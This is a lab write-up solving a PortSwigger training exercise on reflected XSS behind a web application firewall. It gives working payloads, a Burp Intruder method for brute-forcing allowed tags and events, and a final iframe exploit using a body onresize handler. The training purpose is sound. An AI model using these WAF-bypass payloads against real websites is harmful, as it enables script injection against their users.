# Reflected XSS into HTML context with most tags and attributes blocked
* This lab contains a refelcted XSS vulnerabilities in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors.
	* To solve the lab, perform a XSS attack that bypasses the WAF and calls the `print()` function.

### 1. Test the vulnerable search functionality using a basic XSS attack
```html
<img src=1 onerror=print()>
```
* From the result, this payload is blocked

![4](https://user-images.githubusercontent.com/53956303/153066059-562f887a-3747-484e-9972-0f2168ce6bfc.png)
### 2. Use Burp Intruder to brute force a working XSS payload
* Sent the search request to intruder, clear the position and replace the value of the search term wiht `<>`, and click "Add ยง" twice to locate the position between `<>`

![5](https://user-images.githubusercontent.com/53956303/153066660-25c19d5e-79ff-41a3-8be4-bdab09d080e6.png)
### 3. Paste the tag payloads from the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
![6](https://user-images.githubusercontent.com/53956303/153066887-92f242ed-5439-4fed-a0dd-7d69deb3bb41.png)
![7](https://user-images.githubusercontent.com/53956303/153066936-749b42e4-cdd3-4cf3-816f-72e6bbbd94a0.png)
* Then, start the attack.
	* From the result, a payload "body" gives 200 response 

![8](https://user-images.githubusercontent.com/53956303/153067185-622db139-781b-414f-ad32-f5a926eb691c.png)
### 4. Use the obtained tag in Burp Intruder
* Replace position tab with this
```html
<body%20=1>
```
* Then, click "Add ยง" twice to locate the position after `%20`

![9](https://user-images.githubusercontent.com/53956303/153067605-97c711f2-25af-407d-9e39-53ca4eec520e.png)
### 5. Paste the event payloads from the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
![10](https://user-images.githubusercontent.com/53956303/153067808-5d3563d4-98a2-4631-ab6a-00beb15ed8f3.png)
* Then, strat the attck
	* From the result, a payload `onresize` payload returns 200 response.

![11](https://user-images.githubusercontent.com/53956303/153068449-ad8951af-594e-423e-97d0-aad85c707bde.png)
### 5. Make an exploit using "Go to exploit server" that is provided by the lab
* Using this payload `"><body onresize=print()>" onload=this.style.width='100px'>` (URL encode)
```html
<iframe src="https://ac9e1f1d1fa0f0dbc05fb14800410009.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```
![12](https://user-images.githubusercontent.com/53956303/153069223-551db550-0a7d-41d9-bd3f-755bef6a3822.png)

* Click "Store" and "Deliver exploit to victim"
	* As a result, the lab is solved.

![13](https://user-images.githubusercontent.com/53956303/153069464-86de97a1-c610-4379-80dd-a24fdd42601f.png)
